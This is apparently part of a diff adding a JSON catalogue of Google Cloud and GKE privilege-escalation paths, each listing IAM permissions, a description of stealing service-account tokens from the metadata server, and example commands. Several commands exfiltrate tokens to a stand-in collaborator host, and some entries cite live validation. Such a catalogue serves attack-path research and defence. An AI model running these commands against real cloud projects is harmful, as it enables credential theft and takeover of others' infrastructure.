+        "description": "Create a K8s ClusterRoleBinding granting cluster-admin (or any privileged ClusterRole) to the attacker identity. From cluster-admin: create privileged pods, exec into pods, access GCE metadata endpoint, steal node SA token.",
+        "example_command": "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=NAMESPACE:ATTACKER_SA",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "EXCHANGE_GKE_SA_TOKEN_VIA_WIF": {
+        "permissions": [
+          "container.serviceAccounts.createToken"
+        ],
+        "on": "k8scluster",
+        "description": "Create a K8s ServiceAccount token. If the SA has a Workload Identity binding (iam.gke.io/gcp-service-account annotation), exchange the K8s SA JWT for a GCP access token via the Security Token Service, impersonating the bound GCP SA.",
+        "example_command": "kubectl create token WIF_BOUND_KSA -n NAMESPACE; curl \"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/GCP_SA:generateAccessToken\" -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}' -H \"Authorization: Bearer KSA_TOKEN\"",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "EXEC_GKE_POD_AS_SA": {
+        "permissions": [
+          "container.pods.attach"
+        ],
+        "on": "k8spod",
+        "description": "Attach to a running container (stdin/stdout/stderr). Functionally equivalent to exec (already in og_defined_edges.json: container.pods.exec). Interactive shell \u2192 access GCE metadata endpoint \u2192 steal SA token.",
+        "example_command": "kubectl attach POD -c CONTAINER -i -t",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "IMPERSONATE_SYSTEM_MASTERS_GROUP": {
+        "permissions": [
+          "container.clusters.impersonate"
+        ],
+        "on": "k8scluster",
+        "description": "The GCP IAM permission container.clusters.impersonate enables kubectl --as-group=system:masters which bypasses all K8s RBAC checks. system:masters is bound to cluster-admin, granting full cluster access. This is equivalent to cluster-admin without needing K8s RBAC changes.",
+        "example_command": "modules exploit_gke_cluster_sa --cluster {target_resource} --location ZONE --mode impersonate-masters",
+        "via": "resource",
+        "status": "VALIDATED",
+        "evidence": [
+          "Live test 2026-09-28: research-src-gke-lm@staging-project-2.iam.gserviceaccount.com",
+          "kubectl get nodes --as-group=system:masters --as=research-src-test-user \u2192 Node list returned",
+          "No K8s RBAC role required; system:masters bypasses all K8s RBAC via GKE impersonation webhook"
+        ]
+      },
+      "CREATE_POD_STEAL_SA_TOKEN": {
+        "permissions": [
+          "container.pods.create"
+        ],
+        "on": "k8scluster",
+        "description": "Create a pod in a GKE cluster namespace. The pod runs with the node's service account (or a Workload Identity-bound KSA) and can access the GCE metadata server at 169.254.169.254 to steal SA access tokens. Combine with container.pods.exec or container.pods.attach to get an interactive shell and steal tokens. Attacker chooses pod spec including privileged mode, host networking, host PID, etc.",
+        "example_command": "modules exploit_gke_cluster_sa --cluster {target_resource} --location ZONE --mode steal-pod-token",
+        "via": "resource",
+        "status": "VALIDATED",
+        "evidence": [
+          "Live test 2026-09-28: kubectl run research-test-pod --image=google/cloud-sdk:slim -n default",
+          "Pods created: research-test-pod, research-test-pod2",
+          "Pod scheduling confirmed on node gke-research-gke-t1-default-pool-4c199c0f-996g"
+        ]
+      }
+    },
+    "cloudrun": {
+      "CREATE_CLOUDRUN_SERVICE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "run.services.create",
+              "artifactregistry.repositories.downloadArtifacts"
+            ],
+            "on": "project"
+          }
+        ],
+        "edge": "CREATE_CLOUDRUN_SERVICE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Deploy a Cloud Run service bound to the target SA and invoke it to execute arbitrary code and exfiltrate the SA's OAuth token. actAs IS required at service creation time (Cloud Run v2 API checks iam.serviceaccounts.actAs before accepting the request). Minimum via REST API: run.services.create + artifactregistry.repositories.downloadArtifacts on the project; gcloud CLI additionally requires run.services.get. Live-validated 2026-09-28.",
+        "example_command": "modules exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --exfil-mode logs --invoke --cleanup",
+        "status": "VALIDATED",
+        "actas_required": true
+      },
+      "UPDATE_CLOUDRUN_SERVICE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "run.services.update"
+            ],
+            "on": "cloudrunservice"
+          }
+        ],
+        "edge": "UPDATE_CLOUDRUN_SERVICE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Update an existing Cloud Run service to swap in a malicious container image bound to the target SA, then invoke it to exfiltrate the SA's OAuth token from the GCE metadata endpoint.",
+        "example_command": "modules exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --update-existing --service-name EXISTING_SERVICE --exfil-url https://BURP_COLLAB --invoke --cleanup",
+        "requires_resource_exists": true,
+        "capability_resource_type": "cloudrunservice"
+      },
+      "CREATE_CLOUDRUN_JOB_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "run.jobs.create"
+            ],
+            "on": "cloudrunjob"
+          }
+        ],
+        "edge": "CREATE_CLOUDRUN_JOB_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create and execute a Cloud Run Job bound to the target SA, running arbitrary container code that steals the SA's OAuth token from the GCE metadata endpoint.",
+        "example_command": "modules exploit_cloudrun_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "cloudrunjob"
+      },
+      "UPDATE_CLOUDRUN_JOB_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "run.jobs.update",
+              "run.jobs.run"
+            ],
+            "on": "cloudrunjob"
+          }
+        ],
+        "edge": "UPDATE_CLOUDRUN_JOB_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Update an existing Cloud Run Job to replace its container image and service account with the target SA, then execute it to steal the SA's OAuth token via the GCE metadata endpoint.",
+        "example_command": "modules exploit_cloudrun_job_as_sa --target-sa {target_sa} --update-existing --job-name EXISTING_JOB --exfil-url https://BURP_COLLAB",
+        "requires_resource_exists": true,
+        "capability_resource_type": "cloudrunjob"
+      },
+      "CREATE_CLOUDRUN_WORKERPOOL_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "run.workerPools.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_CLOUDRUN_WORKERPOOL_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Run Worker Pool bound to the target SA, hosting long-running background containers that exfiltrate the SA's credentials from the metadata server.",
+        "example_command": "modules exploit_cloudrun_workerpool_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "cloudrunworkerpool"
+      },
+      "SSH_CLOUDRUN_JOB_AS_SA": {
+        "permissions": [
+          "run.jobs.sshRoot"
+        ],
+        "on": "cloudrun",
+        "description": "SSH as root into a Cloud Run Job execution environment. From the container, access the GCE metadata endpoint to steal the Cloud Run SA token. Similar to run.services.sshRoot (already in og_defined_edges.json).",
+        "example_command": "gcloud run jobs execute JOB --region=REGION; gcloud beta run jobs ssh JOB --region=REGION",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "SSH_CLOUDRUN_WORKERPOOL_AS_SA": {
+        "permissions": [
+          "run.workerpools.sshRoot"
+        ],
+        "on": "cloudrun",
+        "description": "SSH as root into a Cloud Run Worker Pool instance. Steal SA token from GCE metadata endpoint.",
+        "example_command": "gcloud beta run worker-pools ssh WORKER_POOL --region=REGION",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "CAN_MODIFY_CLOUD_RUN_JOB_IAM": {
+        "permissions": [
+          "run.jobs.setIamPolicy"
+        ],
+        "on": "cloudrunjob",
+        "description": "Modify a Cloud Run Job's IAM policy (e.g., grant run.jobs.run), then trigger a job execution to run code as the job's SA.",
+        "example_command": "modules run exploit_gcp_setiampolicy --service cloudrunjob --member user:ATTACKER@example.com --role roles/run.developer"
+      },
+      "CAN_MODIFY_CLOUD_RUN_SERVICE_IAM": {
+        "permissions": [
+          "run.services.setIamPolicy"
+        ],
+        "on": "cloudrunservice",
+        "description": "Modify a Cloud Run service's IAM policy to allow unauthenticated invocation, then invoke the service to trigger code running as its SA.",
+        "example_command": "modules run exploit_gcp_setiampolicy --service cloudrun --member allUsers --role roles/run.invoker"
+      },
+      "CREATE_RUN_WORKERPOOL_AS_SA": {
+        "edge": "CAN_CREATE_RUN_WORKERPOOL",
+        "requires": [
+          {
+            "permissions": [
+              "run.workerpools.create"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Run Worker Pool \u2014 a persistent, non-request-driven worker container that runs continuously with an attached service account. Unlike Cloud Run Services (HTTP-triggered) or Jobs (one-shot), Worker Pools run indefinitely. The container can query http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token for the attached SA's OAuth2 token exactly as other Cloud Run resource types do. Requires actAs at creation time.",
+        "example_command": "gcloud run worker-pools create pwn-worker --image python:3.11-slim --service-account TARGET_SA_EMAIL --region us-central1 --project PROJECT_ID",
+        "caveats": [
+          "PREREQUISITE: Cloud Run service agent (service-{PROJECT_NUMBER}@serverless-robot-prod.iam.gserviceaccount.com) must have roles/iam.serviceAccountTokenCreator on TARGET_SA; requires iam.serviceAccounts.setIamPolicy OR an IAM admin to grant it",
+          "Worker pool container starts immediately (min-instances=1) and persists \u2014 no invocation required, unlike Cloud Run Services",
+          "serviceAccount field in template.containers[].serviceAccount OR template.serviceAccount (v2 WorkerPool body)"
+        ]
+      }
+    },
+    "cloudfunctions": {
+      "CREATE_AND_INVOKE_CLOUDFUNCTION_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudfunctions.functions.create",
+              "cloudfunctions.functions.sourceCodeSet"
+            ],
+            "on": "cloudfunction"
+          },
+          {
+            "permissions": [
+              "cloudfunctions.functions.call"
+            ],
+            "on": "cloudfunction"
+          }
+        ],
+        "edge": "CREATE_AND_INVOKE_CLOUDFUNCTION_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Deploy a new Cloud Function bound to the target SA and invoke it to execute arbitrary code and exfiltrate the SA's OAuth token.",
+        "example_command": "modules exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --create --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "cloudfunction"
+      },
+      "UPDATE_AND_INVOKE_CLOUDFUNCTION_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudfunctions.functions.update",
+              "cloudfunctions.functions.sourceCodeSet"
+            ],
+            "on": "cloudfunction"
+          },
+          {
+            "permissions": [
+              "cloudfunctions.functions.call"
+            ],
+            "on": "cloudfunction"
+          }
+        ],
+        "edge": "UPDATE_AND_INVOKE_CLOUDFUNCTION_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Update an existing Cloud Function to swap in malicious code bound to the target SA, then invoke it to exfiltrate the SA's OAuth token.",
+        "example_command": "modules exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --function-name EXISTING_FUNC --exfil-url https://BURP_COLLAB",
+        "requires_resource_exists": true,
+        "capability_resource_type": "cloudfunction"
+      }
+    },
+    "cloudbuild": {
+      "CAN_CREATE_CLOUDBUILD_DEFAULT_IDENTITY": {
+        "permissions": [
+          "cloudbuild.builds.create"
+        ],
+        "description": "Submit a Cloud Build job that executes arbitrary code as the project's Cloud Build service account (PROJECT_NUMBER@cloudbuild.gserviceaccount.com). The token is exfiltrable from job logs.",
+        "example_command": "modules exploit_cloudbuild_build_as_sa --project-id {project_id} --exfil-mode logs --inline-script \"curl -sf -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\""
+      },
+      "CREATE_CLOUDBUILD_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudbuild.builds.create"
+            ],
+            "on": "cloudbuildbuild"
+          }
+        ],
+        "edge": "CREATE_CLOUDBUILD_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Submit a Cloud Build build pinned to the target SA, running arbitrary build steps that execute code with that SA's credentials.",
+        "example_command": "modules exploit_cloudbuild_build_as_sa --project-id {project_id} --target-sa {target_sa} --exfil-mode logs --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "cloudbuildbuild"
+      },
+      "CREATE_CLOUDBUILD_TRIGGER_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudbuild.triggers.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_CLOUDBUILD_TRIGGER_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Build trigger pinned to the target SA and run it, executing arbitrary build steps with that SA's credentials and exfiltrating its OAuth token via Cloud Logging or HTTP callback.",
+        "example_command": "modules exploit_cloudbuild_trigger_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB --cleanup",
+        "capability_resource_type": "cloudbuildtrigger"
+      },
+      "CAN_UPDATE_CLOUDBUILD_BUILD": {
+        "permissions": [
+          "cloudbuild.builds.update"
+        ],
+        "description": "Update an in-progress or queued Cloud Build build to inject malicious build steps. Those steps run as the build's SA and can query the metadata server to exfiltrate a ya29.* OAuth2 token.",
+        "example_command": "modules run exploit_cloudbuild_build_as_sa --target-sa {target_sa} --exfil-mode logs"
+      }
+    },
+    "cloudscheduler": {
+      "CREATE_CLOUDSCHEDULER_JOB_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudscheduler.jobs.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_CLOUDSCHEDULER_JOB_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Scheduler job that calls any googleapis.com REST endpoint authenticated as the target SA, enabling token exfil or direct privilege escalation.",
+        "example_command": "modules exploit_cloudscheduler_job --project-id {project_id} --target-sa {target_sa} --action custom --custom-url https://BURP_COLLAB --run",
+        "capability_resource_type": "cloudschedulerjob"
+      },
+      "UPDATE_SCHEDULER_JOB_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudscheduler.jobs.update"
+            ],
+            "on": "schedulerjob"
+          }
+        ],
+        "edge": "UPDATE_SCHEDULER_JOB_AS_SA",
+        "via": "resource",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Update an existing Cloud Scheduler HTTP job to point its OIDC token service account to a high-privilege SA, or redirect the target URL to an attacker-controlled endpoint to capture the OIDC token. The job fires the updated request on its next schedule or on-demand. actAs on the target SA is required (enforced by the Cloud Scheduler API). cloudscheduler.jobs.get is NOT required when providing a full httpTarget body with updateMask=httpTarget.",
+        "example_command": "gcloud scheduler jobs update http JOB --oidc-service-account-email=TARGET_SA@PROJECT.iam.gserviceaccount.com --uri=https://TARGET_ENDPOINT",
+        "status": "VALIDATED"
+      }
+    },
+    "cloudtasks": {
+      "CREATE_CLOUDTASKS_TASK_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudtasks.queues.create",
+              "cloudtasks.tasks.create"
+            ],
+            "on": "cloudtasksqueue"
+          }
+        ],
+        "edge": "CREATE_CLOUDTASKS_TASK_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Tasks queue and HTTP task authenticated as the target SA, posting the SA's Bearer token to a callback URL or calling a privileged googleapis.com endpoint.",
+        "example_command": "modules exploit_cloudtasks_task_as_sa --target-sa {target_sa} --action callback --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "cloudtasksqueue"
+      },
+      "CREATE_CLOUDTASKS_TASK_ON_EXISTING_QUEUE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "cloudtasks.tasks.create"
+            ],
+            "on": "cloudtasksqueue"
+          }
+        ],
+        "edge": "CREATE_CLOUDTASKS_TASK_ON_EXISTING_QUEUE_AS_SA",
+        "via": "resource",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create an HTTP task on an existing Cloud Tasks queue that already has a service account configured, using the queue's SA to authenticate outbound HTTP requests and exfiltrate its OAuth token to a callback URL.",
+        "example_command": "modules exploit_cloudtasks_task_as_sa --target-sa {target_sa} --action callback --exfil-url https://BURP_COLLAB"
+      }
+    },
+    "eventarc": {
+      "CREATE_EVENTARC_TRIGGER_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "eventarc.triggers.create"
+            ],
+            "on": "project"
+          }
+        ],
+        "edge": "CREATE_EVENTARC_TRIGGER_AS_SA",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create an Eventarc trigger with a target SA as the OIDC service account. actAs IS required at trigger creation time (enforced by Eventarc API). Live-validated 2026-09-28 using --transport-topic (correct Pub/Sub syntax). Earlier 'ACTAS_FREE' finding was a false positive: invalid --event-filters syntax caused failure before the actAs check.",
+        "example_command": "gcloud eventarc triggers create TRIGGER --event-filters=\"type=google.cloud.pubsub.topic.v1.messagePublished\" --transport-topic=projects/PROJECT/topics/TOPIC --destination-run-service=TARGET_SVC --service-account=TARGET_SA",
+        "via": "resource",
+        "status": "VALIDATED",
+        "actas_required": true
+      },
+      "UPDATE_EVENTARC_TRIGGER_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "eventarc.triggers.update"
+            ],
+            "on": "eventarctrigger"
+          }
+        ],
+        "edge": "UPDATE_EVENTARC_TRIGGER_AS_SA",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Update an existing Eventarc trigger to change its service account to a high-privilege SA. Expected to require actAs (consistent with CREATE_EVENTARC_TRIGGER_AS_SA which was confirmed ACTAS_REQUIRED). Not yet live-tested.",
+        "example_command": "gcloud eventarc triggers update TRIGGER --service-account=TARGET_SA",
+        "via": "resource",
+        "status": "PROPOSED",
+        "actas_required": true
+      },
+      "CREATE_EVENTARC_PIPELINE_OAUTH2_AS_SA": {
+        "edge": "CAN_CREATE_EVENTARC_PIPELINE_OAUTH2",
+        "requires": [
+          {
+            "permissions": [
+              "eventarc.pipelines.create"
+            ]
+          },
+          {
+            "on": "service-account",
+            "permissions": [
+              "iam.serviceAccounts.actAs"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account",
+          "notes": "actAs IS enforced at pipeline create time (not deferred to execution)."
+        },
+        "description": "Create an Eventarc pipeline with oauth_token_authentication.service_account_email=TARGET_SA. Eventarc Pipeline delivers an HTTP POST to the destination URL with Authorization: Bearer {TARGET_SA_access_token} in the header. Token verified: azp=100387584643172945274 (TARGET_SA uniqueId), scope=https://www.googleapis.com/auth/cloud-platform, ~1h TTL. Token type: OAuth2 access token (ya29.*), NOT OIDC JWT. Delivery agent User-Agent: Google-mts-convoy. actAs enforced at pipeline creation time (caller must hold actAs on TARGET_SA). Eventarc service agent (service-PROJECT_NUM@gcp-sa-eventarc.iam.gserviceaccount.com) must have roles/iam.serviceAccountTokenCreator on TARGET_SA (auto-granted when eventarc.googleapis.com is enabled via service agent default bindings). Requires: eventarc.pipelines.create + iam.serviceAccounts.actAs + an event source (Pub/Sub topic + Enrollment, or Google API Source, or Kafka). Full confirmed path: create MessageBus -> create Pipeline -> create Enrollment -> publish event to Pub/Sub -> Eventarc delivers HTTP POST with Bearer token.",
+        "example_command": "gcloud eventarc pipelines create pwn-pipeline --destinations=http_endpoint_uri=https://CALLBACK_URL,http_endpoint_message_binding=cloudevents-v1,google_oidc_token_service_account={target_sa}",
+        "caveats": [
+          "Eventarc pipeline (not Eventarc trigger) is required: triggers only support OIDC (id_token), pipelines support both OIDC and OAuth2 (access_token). The oauth_token_authentication field is on the Pipeline destination, not on triggers",
+          "The delivery HTTP method is POST. The event payload is delivered as the request body (CloudEvents JSON). The Bearer token is in the Authorization header",
+          "Eventarc service agent needs roles/iam.serviceAccountTokenCreator on TARGET_SA. This is granted by default to the Eventarc service agent when it is provisioned via generateServiceIdentity or when the first pipeline using OAuth2 auth is created",
+          "Pub/Sub enrollment path: (1) create Pub/Sub topic, (2) create Eventarc MessageBus, (3) create Pipeline with destination=CALLBACK_URL + oauth_token_authentication.service_account_email=TARGET_SA, (4) create Enrollment connecting the topic to the pipeline, (5) publish event to Pub/Sub topic",
+          "Source IP in X-Forwarded-For is 0.0.0.0 (Cloud Run internal routing); real egress from Google infrastructure",
+          "If using Cloud Run as capture target: grant TARGET_SA run.invoker on the Cloud Run service (so Eventarc Bearer token is accepted) or set the Cloud Run service to allow allUsers",
+          "CRITICAL OPERATIONAL NOTE: Burp Collaborator (oastify.com) and webhook.site BOTH fail as destinations (httpResponseCode: 503) \u2014 Eventarc managed delivery can resolve DNS (Google IPs 172.253.x.x land in Burp DNS log) but cannot establish outbound HTTPS to public internet. GCP egress layer rejects the connection. Use an in-project GCP endpoint (Cloud Run, Cloud Functions) as the capture target. For Burp relay: deploy a Cloud Run service that logs the Authorization header and forwards to Burp via HTTP POST; Cloud Run returns 200 so Eventarc delivery succeeds. This constraint does NOT apply to Application Integration GenericRestV2Task (which CAN reach Burp Collaborator via public internet)"
+        ]
+      }
+    },
+    "composer": {
+      "CREATE_COMPOSER_ENV_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "composer.environments.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_COMPOSER_ENV_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Cloud Composer environment bound to the target SA, running Airflow DAG tasks that steal the SA's credentials from the GKE metadata server.",
+        "example_command": "modules exploit_composer_env_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "composerenv"
+      },
+      "UPDATE_COMPOSER_ENV_AS_SA": {
+        "permissions": [
+          "composer.environments.update"
+        ],
+        "on": "composerenvironment",
+        "description": "ConfusedComposer (Tenable TRA-2025-03): update Composer environment to install a malicious PyPI package that triggers Cloud Build execution with the Cloud Build SA (roles/cloudbuild.builds.builder). Partially patched April 2025 for new environments; existing environments may remain vulnerable.",
+        "example_command": "gcloud composer environments update ENV --update-pypi-packages-from-file=requirements.txt --location=REGION",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "EXEC_COMPOSER_ENV_AS_SA": {
+        "permissions": [
+          "composer.environments.executeAirflowCommand"
+        ],
+        "on": "composerenvironment",
+        "description": "Execute an arbitrary Airflow CLI command in a Cloud Composer environment. This provides shell access as the Composer worker SA. Access the GCE metadata endpoint to steal the SA token.",
+        "example_command": "gcloud composer environments run ENV --location=REGION variables -- --import /dev/null; # or dags trigger, tasks run etc.",
+        "via": "resource",
+        "status": "PROPOSED"
+      }
+    },
+    "appengine": {
+      "CREATE_APPENGINE_VERSION_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "appengine.versions.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_APPENGINE_VERSION_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Deploy a new App Engine version bound to the target SA, hosting arbitrary application code that reads the SA's credentials from the App Engine metadata endpoint.",
+        "example_command": "modules exploit_appengine_version_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "appengineversion"
+      },
+      "UPDATE_APPENGINE_APPLICATION_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "appengine.applications.update"
+            ]
+          }
+        ],
+        "edge": "UPDATE_APPENGINE_APPLICATION_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "PATCH the App Engine application's service account field to the target SA, causing all subsequent version deployments and request handling to run as the target SA without deploying a new version.",
+        "example_command": "modules exploit_appengine_version_as_sa --target-sa {target_sa} --update-app",
+        "capability_resource_type": "appengineapp"
+      }
+    },
+    "vertex": {
+      "CREATE_VERTEX_CUSTOM_JOB_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "aiplatform.customJobs.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_VERTEX_CUSTOM_JOB_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Submit a Vertex AI Custom Job bound to the target SA, running arbitrary training container code that reads the SA's OAuth token from the GCE metadata endpoint.",
+        "example_command": "modules exploit_vertex_custom_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "vertexcustomjob"
+      },
+      "CREATE_VERTEX_PIPELINE_JOB_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "aiplatform.pipelineJobs.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_VERTEX_PIPELINE_JOB_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Submit a Vertex AI Pipeline job that runs its steps as the target SA, enabling container-level code execution to steal the SA's access token from metadata.",
+        "example_command": "modules exploit_vertex_pipeline_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "vertexpipelinejob"
+      },
+      "CREATE_VERTEX_TRAINING_PIPELINE_AS_SA": {
+        "permissions": [
+          "aiplatform.trainingPipelines.create"
+        ],
+        "on": "project",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Vertex AI Training Pipeline with a custom container image. The training job runs as the configured SA. Within the training container, access the GCE metadata endpoint to steal the SA token.",
+        "example_command": "gcloud ai custom-jobs create --display-name=PE_TEST --worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=gcr.io/ATTACKER/exfil --service-account=TARGET_SA",
+        "via": "capability",
+        "status": "PROPOSED"
+      },
+      "CREATE_VERTEX_REASONING_ENGINE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "aiplatform.reasoningEngines.create"
+            ]
+          }
+        ],
+        "edge": "CREATE_VERTEX_REASONING_ENGINE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Vertex AI Reasoning Engine (Agentspace) bound to the target SA, deploying arbitrary Python code that steals the SA's credentials from the GCE metadata server.",
+        "example_command": "modules exploit_vertex_reasoning_engine_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "vertexreasoningengine"
+      },
+      "CREATE_VERTEX_ENDPOINT_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "aiplatform.endpoints.create",
+              "aiplatform.endpoints.deploy"
+            ]
+          }
+        ],
+        "edge": "CREATE_VERTEX_ENDPOINT_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Vertex AI Endpoint and deploy a malicious model container that runs as the target SA, exploiting metadata server access in the prediction worker pods.",
+        "example_command": "modules exploit_vertex_endpoint_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
+        "capability_resource_type": "vertexendpoint"
+      },
+      "CREATE_VERTEX_NOTEBOOK_RUNTIME_AS_SA": {
+        "permissions": [
+          "notebooks.runtimes.create"
+        ],
+        "on": "project",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a Colab Enterprise runtime configured to run as a high-privilege SA. Connect to the runtime and execute code that accesses the GCE metadata endpoint to steal the SA token.",
+        "example_command": "gcloud notebooks runtimes create RUNTIME --service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com",
+        "via": "capability",
+        "status": "PROPOSED"
+      },
+      "CREATE_VERTEX_TUNING_JOB_AS_SA": {
+        "edge": "CAN_CREATE_VERTEX_TUNING_JOB",
+        "requires": [
+          {
+            "permissions": [
+              "aiplatform.tuningJobs.create",
+              "aiplatform.tuningJobs.vertexTune"
+            ]
+          }
+        ],
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account",
+          "notes": "actAs IS enforced \u2014 but behavior is non-deterministic."
+        },
